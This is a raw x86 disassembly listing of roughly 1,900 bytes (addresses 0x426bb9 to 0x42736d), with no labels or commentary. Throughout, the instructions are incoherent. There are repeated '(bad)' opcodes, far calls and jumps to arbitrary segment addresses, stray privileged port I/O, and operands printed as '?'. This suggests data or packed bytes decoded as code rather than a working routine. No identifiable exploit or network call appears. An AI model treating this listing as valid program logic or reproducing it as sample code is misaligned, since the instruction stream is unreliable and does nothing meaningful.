  426bb9:	test   DWORD PTR [esi+0x5ac007d7],eax
  426bbf:	inc    ecx
  426bc0:	sbb    al,0xb8
  426bc2:	and    dl,BYTE PTR [ebx+0x1a]
  426bc5:	or     esp,DWORD PTR [edi+0x577fd04d]
  426bcb:	mov    edx,0xc99eb694
  426bd0:	inc    eax
  426bd1:	cdq    
  426bd2:	push   ebx
  426bd3:	pop    esi
  426bd4:	jno    0x426c43
  426bd6:	cmp    eax,0xf65a5e6f
  426bdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426bdc:	stc    
  426bdd:	push   ebp
  426bde:	imul   edx,DWORD PTR [eax-0x6926cf9b],0xfa987fb2
  426be8:	inc    ebx
  426be9:	adc    bh,BYTE PTR [ebx]
  426beb:	scas   al,BYTE PTR es:[edi]
  426bec:	cld    
  426bed:	add    al,0xce
  426bef:	push   ebp
  426bf0:	xor    al,0xbd
  426bf2:	call   0x8d1e:0x3d3547b8
  426bf9:	(bad)  
  426bfa:	jg     0x426b9c
  426bfc:	mov    bl,0x5c
  426bfe:	xchg   ebp,eax
  426bff:	adc    bh,dh
  426c01:	rcr    DWORD PTR [edx],cl
  426c03:	pop    ecx
  426c04:	mov    dh,0x9f
  426c06:	sbb    al,0x5f
  426c08:	imul   ebx,DWORD PTR [ebx-0x15165878],0xde1300e9
  426c12:	push   ebx
  426c13:	xor    DWORD PTR [edx-0x14d12471],0xffffffb2
  426c1a:	dec    ecx
  426c1b:	lods   al,BYTE PTR ds:[esi]
  426c1c:	pop    es
  426c1d:	add    al,0x15
  426c1f:	mov    esi,0xbabaf546
  426c24:	daa    
  426c25:	inc    ebx
  426c26:	mov    ds:0x8618c16a,eax
  426c2b:	add    esi,DWORD PTR [eax+0x72ed0627]
  426c31:	inc    ebp
  426c32:	or     eax,DWORD PTR [esi]
  426c34:	imul   esp,DWORD PTR [eax+0x67],0xffffffa7
  426c38:	mov    esp,0xd7dffa91
  426c3d:	iret   
  426c3e:	jo     0x426bf2
  426c40:	loop   0x426c1c
  426c42:	pop    ebp
  426c43:	sbb    esi,DWORD PTR [ebp-0x5df026dc]
  426c49:	push   ebp
  426c4a:	and    DWORD PTR [edx],0xffffffb9
  426c4d:	rcr    DWORD PTR [edx+0x4e],1
  426c50:	push   ecx
  426c51:	ds and al,0xa7
  426c54:	aad    0x37
  426c56:	mov    edi,0x81756cb8
  426c5b:	xor    al,0xb2
  426c5d:	pop    ebp
  426c5e:	out    0xc3,eax
  426c60:	add    dl,al
  426c62:	pop    ebp
  426c63:	pop    ebp
  426c64:	fstp   TBYTE PTR [edi-0x61]
  426c67:	test   al,0x28
  426c69:	jmp    0x1bc4:0x56d2b4b8
  426c70:	call   DWORD PTR [edi]
  426c72:	fwait
  426c73:	xchg   esi,eax
  426c74:	test   al,0xe1
  426c76:	dec    esp
  426c77:	sbb    BYTE PTR [eax+0x39fdaabc],0x23
  426c7e:	imul   ebp,DWORD PTR [esi],0x66
  426c81:	or     dh,ah
  426c83:	push   fs
  426c85:	lahf   
  426c86:	xchg   esp,eax
  426c87:	mov    esp,0x7822ff52
  426c8c:	scas   al,BYTE PTR es:[edi]
  426c8d:	mov    bl,BYTE PTR [esi+0x4a3bf235]
  426c93:	sub    eax,0xa75c4a12
  426c98:	xchg   edi,eax
  426c99:	js     0x426c7b
  426c9b:	xor    dh,BYTE PTR [ecx+0x2c]
  426c9e:	xchg   edi,eax
  426c9f:	sbb    DWORD PTR [edi+0x17a13e5c],esi
  426ca5:	push   ebp
  426ca6:	pop    edx
  426ca7:	mov    ds:0xbb334d36,eax
  426cac:	in     al,0x33
  426cae:	scas   al,BYTE PTR es:[edi]
  426caf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426cb0:	lods   al,BYTE PTR ds:[esi]
  426cb1:	pop    edx
  426cb2:	out    dx,al
  426cb3:	pop    edx
  426cb4:	dec    esi
  426cb5:	xchg   esp,eax
  426cb6:	call   0x2b31:0x7eb5f74d
  426cbd:	inc    esp
  426cbe:	fldenv [esi-0x7ef1e0cf]
  426cc4:	add    esp,ecx
  426cc6:	push   ds
  426cc7:	push   edi
  426cc8:	fdivr  st,st(3)
  426cca:	call   0xc428:0x7b34ed7e
  426cd1:	inc    ecx
  426cd2:	and    eax,0x1a390bba
  426cd7:	jmp    0x5c5c960a
  426cdc:	jecxz  0x426c7d
  426cde:	lods   eax,DWORD PTR ds:[esi]
  426cdf:	inc    esi
  426ce0:	mov    bl,0x50
  426ce2:	sbb    eax,0x9c88c8f4
  426ce7:	clc    
  426ce8:	inc    esi
  426ce9:	mov    esi,0x4952a769
  426cee:	inc    ecx
  426cef:	push   eax
  426cf0:	je     0x426cd9
  426cf2:	xchg   ecx,ebp
  426cf4:	mov    dl,0xa2
  426cf6:	mov    WORD PTR [edx+0x5990d549],?
  426cfc:	adc    esi,DWORD PTR [edx+0x3e]
  426cff:	call   0xdf02:0xe81d5c90
  426d06:	mov    cl,0x97
  426d08:	xor    ch,BYTE PTR [esi]
  426d0a:	das    
  426d0b:	jnp    0x426cbf
  426d0d:	cmp    DWORD PTR [ebx+0x4fc1a8c6],ecx
  426d13:	push   cs
  426d14:	ins    DWORD PTR es:[edi],dx
  426d15:	or     esp,DWORD PTR ds:0x73eea2f0
  426d1b:	jecxz  0x426cab
  426d1d:	sti    
  426d1e:	popf   
  426d1f:	xor    dl,BYTE PTR [edx+0x42be8bbf]
  426d25:	inc    ecx
  426d26:	lock iret 
  426d28:	or     BYTE PTR [ebx],cl
  426d2a:	pop    es
  426d2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426d2c:	(bad)  
  426d2d:	lods   eax,DWORD PTR ds:[esi]
  426d2e:	cli    
  426d2f:	fidivr WORD PTR ds:0xbdb29a34
  426d35:	(bad)  
  426d36:	jno    0x426d1a
  426d38:	mov    edi,0xf8556202
  426d3d:	or     esp,DWORD PTR [ecx]
  426d3f:	ins    DWORD PTR es:[edi],dx
  426d40:	out    0x35,al
  426d42:	mov    ecx,edi
  426d44:	scas   eax,DWORD PTR es:[edi]
  426d45:	inc    edx
  426d46:	call   0x830e:0x457332e1
  426d4d:	inc    esi
  426d4e:	scas   al,BYTE PTR es:[edi]
  426d4f:	call   0x7460:0x5d9aca9b
  426d56:	das    
  426d57:	sub    eax,0xfb9af801
  426d5c:	(bad)  
  426d5d:	xchg   esp,eax
  426d5e:	mov    ds:0x8e63c5e5,eax
  426d63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426d64:	call   0x8c55a19f
  426d69:	test   DWORD PTR [esp+edi*2+0x159b70b1],ecx
  426d70:	inc    esp
  426d71:	dec    ecx
  426d72:	aad    0xf
  426d74:	inc    ebp
  426d75:	ins    DWORD PTR es:[edi],dx
  426d76:	mov    ds:0xeb4394a7,eax
  426d7b:	and    esp,DWORD PTR [ebx+eiz*4-0x2f]
  426d7f:	pop    ebp
  426d80:	scas   al,BYTE PTR es:[edi]
  426d81:	pop    esp
  426d82:	or     BYTE PTR ds:0xdd9b4cb2,0x73
  426d89:	jecxz  0x426d46
  426d8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d8c:	icebp  
  426d8d:	in     eax,dx
  426d8e:	mov    DWORD PTR [edx+0x50399fcc],esi
  426d94:	sub    dh,BYTE PTR [ecx+0xeb55bba]
  426d9a:	or     esi,DWORD PTR [esi+0x7f]
  426d9d:	pop    esi
  426d9e:	in     eax,0x84
  426da0:	or     DWORD PTR [ebp+0x0],0x77
  426da4:	imul   ecx,edx,0xfd87a43a
  426daa:	lock xor bl,BYTE PTR [esi+esi*1+0x30ffa662]
  426db2:	loope  0x426db0
  426db4:	lds    ebp,FWORD PTR [edx+ebx*4]
  426db7:	scas   eax,DWORD PTR es:[edi]
  426db8:	jb     0x426d6d
  426dba:	sbb    al,BYTE PTR [edi]
  426dbc:	sub    BYTE PTR [edx+ecx*1+0x29cd18a4],dl
  426dc3:	outs   dx,BYTE PTR ds:[esi]
  426dc4:	dec    esp
  426dc5:	adc    ebx,DWORD PTR [eax]
  426dc7:	(bad)  
  426dc8:	repnz xor al,0xc2
  426dcb:	imul   esi,DWORD PTR [edx-0x59a15fee],0xffffff98
  426dd2:	or     bl,ah
  426dd4:	or     dh,cl
  426dd6:	xchg   ebp,eax
  426dd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426dd8:	lods   al,BYTE PTR ds:[esi]
  426dd9:	inc    eax
  426dda:	and    eax,0x26ed44d9
  426ddf:	(bad)  
  426de0:	frstor [ecx-0x3a]
  426de3:	sahf   
  426de4:	out    dx,eax
  426de5:	or     edi,DWORD PTR [ecx]
  426de7:	push   edi
  426de8:	jle    0x426daf
  426dea:	mov    ah,0xfc
  426dec:	jecxz  0x426df9
  426dee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426def:	icebp  
  426df0:	xor    eax,0x7646deb6
  426df5:	jle    0x426d90
  426df7:	popa   
  426df8:	fsubr  DWORD PTR [ebx-0x7c864961]
  426dfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426dff:	add    bl,BYTE PTR [ebx+0x64ef1b0c]
  426e05:	or     dl,BYTE PTR [edi+esi*2-0xc]
  426e09:	cdq    
  426e0a:	dec    eax
  426e0b:	inc    edi
  426e0c:	mov    dl,0x16
  426e0e:	iret   
  426e0f:	push   edx
  426e10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426e11:	inc    edx
  426e12:	dec    ebp
  426e13:	xchg   esp,eax
  426e14:	xchg   esp,eax
  426e15:	or     esi,DWORD PTR [eax-0x64]
  426e18:	xlat   BYTE PTR ds:[ebx]
  426e19:	sbb    dh,0xac
  426e1c:	fisub  WORD PTR [edi]
  426e1e:	call   0xb665:0x1136c422
  426e25:	mov    edi,0x338ea793
  426e2a:	popa   
  426e2b:	mov    ecx,esp
  426e2d:	jo     0x426e55
  426e2f:	(bad)  [eax-0x35f0fd70]
  426e35:	out    dx,eax
  426e36:	imul   edx,DWORD PTR [eax+0x52],0x37
  426e3a:	jb     0x426e53
  426e3c:	mov    dl,0x76
  426e3e:	or     edx,DWORD PTR [ebp-0x28]
  426e41:	mov    esi,DWORD PTR [edx-0x14f447d3]
  426e47:	jns    0x426e0d
  426e49:	arpl   WORD PTR [ecx],bx
  426e4b:	jbe    0x426e13
  426e4d:	js     0x426de9
  426e4f:	test   BYTE PTR [esi-0xb],bl
  426e52:	pusha  
  426e53:	jno    0x426e12
  426e55:	test   DWORD PTR [esp+eiz*4+0x57da625f],ebp
  426e5c:	rcl    BYTE PTR [edi+0x7f],1
  426e5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e60:	dec    eax
  426e61:	fs sbb eax,0x22c29c30
  426e67:	in     al,dx
  426e68:	mov    dl,0x6a
  426e6a:	cld    
  426e6b:	xchg   edi,eax
  426e6c:	or     al,0x80
  426e6e:	fadd   QWORD PTR [edi+0x26e00bef]
  426e74:	lods   al,BYTE PTR ds:[esi]
  426e75:	les    esi,FWORD PTR [ecx]
  426e77:	and    DWORD PTR [ebx-0x4df0163f],ecx
  426e7d:	push   ebx
  426e7e:	std    
  426e7f:	jecxz  0x426e3f
  426e81:	sub    BYTE PTR [edi-0x5a0883bc],cl
  426e87:	sti    
  426e88:	mov    edx,0x9eda679a
  426e8e:	xor    eax,0x9af0b3b5
  426e93:	push   esp
  426e94:	outs   dx,BYTE PTR ds:[esi]
  426e95:	xor    dh,ah
  426e97:	push   0xffffffde
  426e99:	mov    edx,0xe0cfa7d7
  426e9e:	dec    esp
  426e9f:	xor    bh,dl
  426ea1:	inc    edx
  426ea2:	cdq    
  426ea3:	push   DWORD PTR [edx+0x5bc3afc4]
  426ea9:	mov    edi,DWORD PTR [ebx]
  426eab:	mov    ecx,0x97760b46
  426eb0:	pop    ebp
  426eb1:	add    DWORD PTR [ecx+edi*2-0x1c2db1ca],edx
  426eb8:	rol    BYTE PTR [edx+eax*2],cl
  426ebb:	dec    edx
  426ebc:	sbb    DWORD PTR [ebx+0x8],ebp
  426ebf:	xor    DWORD PTR [eax+ecx*4],0x67
  426ec3:	mov    eax,ds:0xa3638c24
  426ec8:	add    edx,DWORD PTR [ecx-0x747d645a]
  426ece:	and    eax,0xdb82845b
  426ed3:	pop    edx
  426ed4:	push   cs
  426ed5:	ja     0x426f38
  426ed7:	sti    
  426ed8:	into   
  426ed9:	fstp   DWORD PTR [edx+0x7a8f5c22]
  426edf:	or     bh,BYTE PTR ds:0xd9029f3e
  426ee5:	lods   eax,DWORD PTR ds:[esi]
  426ee6:	sbb    esi,edi
  426ee8:	jb     0x426f24
  426eea:	dec    edx
  426eeb:	sub    edi,DWORD PTR [eax]
  426eed:	xor    DWORD PTR [ebp-0x1d64914],ecx
  426ef3:	test   BYTE PTR [esi-0x35],ah
  426ef6:	push   esp
  426ef7:	mov    esi,0x29a73f3
  426efc:	and    al,0x88
  426efe:	push   ebp
  426eff:	push   edi
  426f00:	addr16 test esi,eax
  426f03:	mov    al,ds:0x7894ea64
  426f08:	add    edi,DWORD PTR [ebx-0xc608bf]
  426f0e:	xchg   esp,eax
  426f0f:	mov    ah,0xf9
  426f11:	mov    bl,0x7d
  426f13:	pop    es
  426f14:	neg    bl
  426f16:	jne    0x426eee
  426f18:	retf   0xf617
  426f1b:	cmp    al,0x17
  426f1d:	push   ebx
  426f1e:	rcr    BYTE PTR [edi-0x1d6c5c98],1
  426f24:	scas   eax,DWORD PTR es:[edi]
  426f25:	inc    esp
  426f26:	fcomi  st,st(2)
  426f28:	push   edx
  426f29:	or     ch,BYTE PTR [edi+eiz*1-0x3181154e]
  426f30:	cmp    ebp,DWORD PTR [eax+0x8072d09]
  426f36:	loope  0x426f56
  426f38:	lods   al,BYTE PTR ds:[esi]
  426f39:	adc    BYTE PTR [ebx+0x16595a63],cl
  426f3f:	test   eax,0x409ad7cb
  426f44:	das    
  426f45:	jae    0x426f7c
  426f47:	push   es
  426f48:	and    al,0x46
  426f4a:	cmpxchg ch,ah
  426f4d:	pusha  
  426f4e:	sub    BYTE PTR [edi-0x7178c514],ah
  426f54:	jnp    0x426f53
  426f56:	shl    cl,cl
  426f58:	aaa    
  426f59:	adc    edx,DWORD PTR [edi]
  426f5b:	fcmovb st,st(0)
  426f5d:	jmp    0x5967:0xa059a060
  426f64:	(bad)  
  426f65:	sbb    ebp,DWORD PTR [edi]
  426f67:	push   edi
  426f68:	mov    ds:0xcf0e846c,al
  426f6d:	jns    0x426f49
  426f6f:	add    BYTE PTR [edx-0x139af650],bl
  426f75:	jnp    0x426f57
  426f77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426f78:	dec    ebx
  426f79:	outs   dx,DWORD PTR ds:[esi]
  426f7a:	outs   dx,BYTE PTR ds:[esi]
  426f7b:	(bad)  
  426f7c:	mov    bh,0x49
  426f7e:	jae    0x426f4a
  426f80:	mov    dl,0x67
  426f82:	push   ds
  426f83:	stos   DWORD PTR es:[edi],eax
  426f84:	cmp    al,0x7a
  426f86:	xor    esp,DWORD PTR [ecx-0x62]
  426f89:	or     edx,DWORD PTR [ebx]
  426f8b:	xlat   BYTE PTR ds:[ebx]
  426f8c:	retf   
  426f8d:	add    al,0x9e
  426f8f:	or     al,0x11
  426f91:	ds call 0x172b:0x4e84760a
  426f99:	sbb    ebp,DWORD PTR ds:0x18b5c4a7
  426f9f:	test   DWORD PTR [ebp+0x10],0x4db26ff0
  426fa6:	inc    eax
  426fa7:	xor    al,BYTE PTR [edx]
  426fa9:	sbb    edx,eax
  426fab:	add    al,0x1
  426fad:	add    eax,0x3ff51fe7
  426fb2:	(bad)  
  426fb4:	jne    0x426f51
  426fb6:	xchg   ebx,eax
  426fb7:	mov    edx,0x5fa3476e
  426fbc:	pop    ds
  426fbd:	mov    esp,DWORD PTR [eax+0x2eda12f2]
  426fc3:	mov    al,ds:0xa9f70b38
  426fc8:	push   ebp
  426fc9:	aas    
  426fca:	or     eax,0x94ba5821
  426fcf:	lea    ebp,[ecx+ebx*8+0x6f]
  426fd3:	daa    
  426fd4:	test   al,0x76
  426fd6:	sahf   
  426fd7:	fmul   st(6),st
  426fd9:	or     edi,esp
  426fdb:	retf   
  426fdc:	cs dec esp
  426fde:	xor    DWORD PTR [edx],0xffffffeb
  426fe1:	push   ebx
  426fe2:	lea    esp,[ebx]
  426fe4:	sub    BYTE PTR [edi-0x6408ed66],al
  426fea:	arpl   WORD PTR [ebx+0x15],ax
  426fed:	or     ebx,DWORD PTR [ebx-0x299f5587]
  426ff3:	inc    eax
  426ff4:	stos   DWORD PTR es:[edi],eax
  426ff5:	mov    ch,0x9a
  426ff7:	test   eax,0xa0b1e6d4
  426ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426ffd:	or     BYTE PTR [ecx+0xab3dfa7],bh
  427003:	popa   
  427004:	fnsave [ecx+0x5eb2bd5b]
  42700a:	(bad)  
  42700b:	push   0xfffffffb
  42700d:	jge    0x426fc7
  42700f:	mov    ds:0x41a50b31,al
  427014:	or     esp,ebp
  427016:	add    bh,BYTE PTR [esi+0x34]
  427019:	out    0x9a,al
  42701b:	outs   dx,DWORD PTR ds:[esi]
  42701c:	adc    BYTE PTR [ebp-0x18419ed4],0xf9
  427023:	fwait
  427024:	rcl    edi,0x95
  427027:	out    0x68,eax
  427029:	sbb    al,0x65
  42702b:	out    0x37,eax
  42702d:	scas   eax,DWORD PTR es:[edi]
  42702e:	inc    edx
  42702f:	push   0xffffffc6
  427031:	ret    0xe9d
  427034:	xor    eax,esi
  427036:	(bad)  
  427037:	fcom   QWORD PTR [edx-0x24]
  42703a:	mov    edi,0x670b4ef4
  42703f:	ja     0x426fcb
  427041:	icebp  
  427042:	pop    ds
  427043:	adc    al,0xa3
  427045:	mov    ds:0x639d9c9a,eax
  42704a:	mov    dh,0x73
  42704c:	xchg   BYTE PTR [esp+ecx*2-0x5f],al
  427050:	jge    0x426fd3
  427052:	xlat   BYTE PTR ds:[ebx]
  427053:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427054:	jo     0x426ff5
  427056:	call   0x91c2:0x884e5656
  42705d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42705e:	leave  
  42705f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427060:	div    BYTE PTR [edx-0x5a]
  427063:	loope  0x42705e
  427065:	dec    edx
  427066:	jmp    0xe43b:0xabf1b2fb
  42706d:	jno    0x427095
  42706f:	cwde   
  427070:	dec    ebx
  427071:	or     esi,DWORD PTR [ecx-0x25]
  427074:	iret   
  427075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427076:	add    BYTE PTR [ecx-0x33],bl
  427079:	dec    esp
  42707a:	retf   0x13ed
  42707d:	sbb    DWORD PTR [edx-0x4dc8c0bf],0xa191261
  427087:	mov    ecx,0x2764e8fb
  42708c:	out    dx,eax
  42708d:	sbb    eax,0x25dee8c1
  427092:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427093:	push   ebp
  427094:	ins    BYTE PTR es:[edi],dx
  427095:	mov    WORD PTR [edx],?
  427097:	push   esi
  427098:	inc    ecx
  427099:	add    al,0x7b
  42709b:	out    0xd7,al
  42709d:	in     eax,0x77
  42709f:	xor    esi,DWORD PTR [edx-0x10]
  4270a2:	jle    0x42704b
  4270a4:	aaa    
  4270a5:	and    ah,BYTE PTR [esi-0x2742f936]
  4270ab:	lahf   
  4270ac:	mov    dl,0xf5
  4270ae:	fldenv [esi+0x18698291]
  4270b4:	loope  0x4270c4
  4270b6:	push   edi
  4270b7:	or     eax,0xa75516e7
  4270bc:	jle    0x4270c7
  4270be:	mov    eax,ds:0x953c468e
  4270c3:	xchg   esp,eax
  4270c4:	sub    esp,DWORD PTR [ebx+0x58]
  4270c7:	xchg   DWORD PTR [eax+0x64],ebx
  4270ca:	add    al,al
  4270cc:	mov    ebp,0xc0302a0c
  4270d1:	ret    
  4270d2:	retf   0x717
  4270d5:	jbe    0x427061
  4270d7:	push   ecx
  4270d8:	mov    esp,edx
  4270da:	push   esp
  4270db:	daa    
  4270dc:	mov    esi,0x2c311a1f
  4270e1:	je     0x42710f
  4270e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4270e4:	xchg   ecx,edi
  4270e6:	mov    edx,0x39524e32
  4270eb:	push   edi
  4270ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4270ed:	sbb    eax,0x8b9b69a5
  4270f2:	jnp    0x4270f4
  4270f4:	pop    esp
  4270f5:	push   eax
  4270f6:	(bad)  [ecx]
  4270f8:	xchg   edx,eax
  4270f9:	or     edx,DWORD PTR [eax-0x45]
  4270fc:	add    DWORD PTR [ecx+0x6a830ba7],0xc44ade9d
  427106:	popa   
  427107:	aam    0xe2
  427109:	int3   
  42710a:	out    dx,al
  42710b:	stos   BYTE PTR es:[edi],al
  42710c:	aam    0x17
  42710e:	(bad)  
  42710f:	xor    DWORD PTR [edi+0x9],ecx
  427112:	inc    esp
  427113:	fcomp  QWORD PTR [eax]
  427115:	and    edi,ebx
  427117:	loopne 0x4270e5
  427119:	iret   
  42711a:	leave  
  42711b:	into   
  42711c:	mov    dl,0x2d
  42711e:	sbb    al,0x93
  427120:	cwde   
  427121:	lock repnz dec eax
  427124:	add    DWORD PTR [esi+ebx*8-0x59],esi
  427128:	mov    ds:0xeabb8842,al
  42712d:	sub    ebp,DWORD PTR [edx+ebp*8-0x2831715b]
  427134:	mov    dl,0x2a
  427136:	cmp    al,0x28
  427138:	jbe    0x4270da
  42713a:	mov    ah,0xa7
  42713c:	outs   dx,BYTE PTR ds:[esi]
  42713d:	cli    
  42713e:	fs jne 0x4270da
  427141:	and    bl,bl
  427143:	pop    esi
  427144:	mov    dl,0x8e
  427146:	jns    0x4271b4
  427148:	jnp    0x4271b9
  42714a:	sbb    BYTE PTR [edx-0x3539f498],dl
  427150:	adc    al,0x9e
  427152:	sbb    BYTE PTR [eax],0x88
  427155:	mov    dh,0x62
  427157:	stos   DWORD PTR es:[edi],eax
  427158:	mov    ebp,0x15725e22
  42715d:	mov    edx,eax
  42715f:	fmul   DWORD PTR [edi+0x1d]
  427162:	loop   0x42710b
  427164:	ss sbb ebx,ebx
  427167:	inc    edx
  427168:	(bad)  
  42716a:	push   es
  42716b:	(bad)
  42716e:	call   0x351c:0xd21ed3f7
  427175:	jnp    0x427129
  427177:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427178:	mov    ch,0x60
  42717a:	mov    al,ds:0x22ca7707
  42717f:	add    al,0xc7
  427181:	rcr    BYTE PTR [edx+0x2beea5b2],1
  427187:	cmp    al,0xa9
  427189:	leave  
  42718a:	jae    0x427133
  42718c:	call   0xc974d3c2
  427191:	fs push ds
  427193:	pop    es
  427194:	mov    dl,0x5a
  427196:	adc    BYTE PTR [ebx+0x25ed4135],dh
  42719c:	fidiv  WORD PTR ds:0x4d32a219
  4271a2:	outs   dx,BYTE PTR ds:[esi]
  4271a3:	outs   dx,BYTE PTR ds:[esi]
  4271a4:	lahf   
  4271a5:	mov    esi,0xecb250d8
  4271aa:	into   
  4271ab:	fnstsw WORD PTR [ebx]
  4271ad:	jo     0x4271b1
  4271af:	add    ebp,DWORD PTR [ebp+0x752c860b]
  4271b5:	jb     0x427233
  4271b7:	mov    bl,0x89
  4271b9:	inc    edx
  4271ba:	call   0x8fa1:0xbd73f4f8
  4271c1:	fs xchg esi,eax
  4271c3:	mov    al,ds:0x612a5f11
  4271c8:	adc    eax,0x23a842cb
  4271cd:	add    ebx,DWORD PTR [edx-0x41b7ed12]
  4271d3:	stos   BYTE PTR es:[edi],al
  4271d4:	xor    al,0xdf
  4271d6:	clc    
  4271d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4271d8:	jno    0x427188
  4271da:	inc    ecx
  4271db:	(bad)  
  4271dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4271dd:	mov    ebx,0x85b1c12c
  4271e2:	push   cs
  4271e3:	pop    esp
  4271e4:	(bad)  
  4271e5:	aam    0x8e
  4271e7:	push   edi
  4271e8:	xor    eax,0x79a7e038
  4271ed:	mov    eax,ds:0x2b6b443b
  4271f2:	cdq    
  4271f3:	push   cs
  4271f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4271f5:	cmp    al,0xb7
  4271f7:	ds mov dl,0x5d
  4271fa:	sub    al,0xb2
  4271fc:	xor    DWORD PTR [edx],ebp
  4271fe:	and    al,0xa0
  427200:	sub    DWORD PTR [eax-0x482ccc6],eax
  427206:	cmc    
  427207:	repnz and cl,BYTE PTR [eax-0x5d]
  42720b:	not    dh
  42720d:	mov    bh,0xca
  42720f:	fnsave [ecx+0x7e6ce289]
  427215:	adc    eax,0xced0f66
  42721a:	jae    0x4271c3
  42721c:	stc    
  42721d:	mul    cl
  42721f:	imul   ebx,DWORD PTR [esi+0x44],0x2172d08a
  427226:	arpl   WORD PTR [esi],si
  427228:	xchg   ecx,eax
  427229:	das    
  42722a:	mov    edx,0x5ffd39d6
  42722f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427230:	mov    eax,ds:0x3f45b010
  427235:	popf   
  427236:	xchg   ecx,eax
  427237:	imul   esi,DWORD PTR [edx+0x1aa4c836],0x6c
  42723e:	in     eax,0x79
  427240:	xchg   ebp,eax
  427241:	adc    al,0x55
  427243:	cmp    bh,BYTE PTR [ebx+ecx*2-0x26016bca]
  42724a:	ja     0x427209
  42724c:	mov    dl,0xf3
  42724e:	mov    ch,0x21
  427250:	or     DWORD PTR [ecx+0x772d6fe5],0xffffffff
  427257:	pop    ebx
  427258:	or     DWORD PTR [ebx],0x737c62a5
  42725e:	jbe    0x4272c0
  427260:	xchg   esi,eax
  427261:	sbb    DWORD PTR [edx+esi*8-0x4e],edi
  427265:	xchg   BYTE PTR [edx],ah
  427267:	bswap  eax
  427269:	push   ebp
  42726a:	hlt    
  42726b:	sahf   
  42726c:	mov    DWORD PTR [ebx],ecx
  42726e:	inc    esp
  42726f:	push   ecx
  427270:	add    eax,0x9696b0ff
  427275:	jl     0x4272f1
  427277:	pop    ss
  427278:	mov    bl,0xe2
  42727a:	xor    esi,DWORD PTR [esi+0x6ac5e0bb]
  427280:	bound  esi,QWORD PTR [ebx+0x23]
  427283:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427284:	int    0xa7
  427286:	ret    
  427287:	ds sub eax,0xb5f3536f
  42728d:	xor    DWORD PTR [edi+0x49],eax
  427290:	mov    esp,0xa089ab4
  427295:	add    DWORD PTR [esi-0x6ed72559],ecx
  42729b:	and    eax,0xfaae29f8
  4272a0:	mov    dl,0x43
  4272a2:	or     DWORD PTR [esi],ecx
  4272a4:	dec    edx
  4272a5:	mov    al,0xe7
  4272a7:	jge    0x4272d3
  4272a9:	push   ss
  4272aa:	adc    ecx,edx
  4272ac:	sub    DWORD PTR [ebx+0x75],ecx
  4272af:	cmp    ch,BYTE PTR [edx-0x535f1db0]
  4272b5:	stc    
  4272b6:	xor    DWORD PTR [ebp+edi*2+0x25276ab1],esp
  4272bd:	sbb    BYTE PTR [ebp-0x3],bh
  4272c0:	icebp  
  4272c1:	or     edx,DWORD PTR [edi+0x141dd039]
  4272c7:	pop    edi
  4272c8:	xchg   DWORD PTR [ebp+0x3819ed9a],ebx
  4272ce:	add    DWORD PTR [edi],0x6c
  4272d1:	in     eax,0x93
  4272d3:	mov    al,ds:0xfc690734
  4272d8:	inc    ebp
  4272d9:	mov    ecx,edi
  4272db:	les    edx,FWORD PTR [ecx-0x1a]
  4272de:	call   0x6968:0x7bff92dc
  4272e5:	xchg   edx,eax
  4272e6:	and    DWORD PTR [edi+0x6f72a6f5],0xcab30647
  4272f0:	dec    eax
  4272f1:	mov    WORD PTR [edx-0x1863efad],ds
  4272f7:	sbb    al,0xa3
  4272f9:	inc    esi
  4272fa:	jo     0x4272a3
  4272fc:	inc    ebx
  4272fd:	in     al,dx
  4272fe:	jb     0x42730e
  427300:	adc    al,0x88
  427302:	dec    eax
  427303:	sbb    eax,0x524720b2
  427308:	mov    edx,0xb7fd9978
  42730d:	jmp    0x980c1362
  427312:	adc    ecx,eax
  427314:	or     edi,DWORD PTR ds:[edx+0x64e6cbe7]
  42731b:	push   edi
  42731c:	mov    dl,0x65
  42731e:	fcomi  st,st(7)
  427320:	xchg   esp,eax
  427321:	mov    ebp,0xb0fe30c
  427326:	and    DWORD PTR [edx+0x327286c6],esi
  42732c:	outs   dx,DWORD PTR ds:[esi]
  42732d:	push   edi
  42732e:	test   DWORD PTR [ebp-0x5640d70],esp
  427334:	push   edi
  427335:	inc    edi
  427336:	inc    ebx
  427337:	mov    ebx,0xa75085c2
  42733c:	(bad)  
  42733d:	int3   
  42733e:	sub    dh,al
  427340:	int    0xc8
  427342:	std    
  427343:	sub    al,0xac
  427345:	retf   0xbc8f
  427348:	repnz mov ebx,0x7c3aea29
  42734e:	hlt    
  42734f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427350:	mov    eax,0x9cd35a6b
  427355:	jmp    0x427336
  427357:	xor    BYTE PTR [ecx+0x4afecc99],0xf7
  42735e:	mov    ds:0x7b630107,eax
  427363:	inc    ecx
  427364:	pop    edi
  427365:	jle    0x427342
  427367:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427368:	loopne 0x4272f5
  42736a:	outs   dx,DWORD PTR ds:[esi]
  42736b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42736c:	outs   dx,BYTE PTR ds:[esi]
  42736d:	hlt    
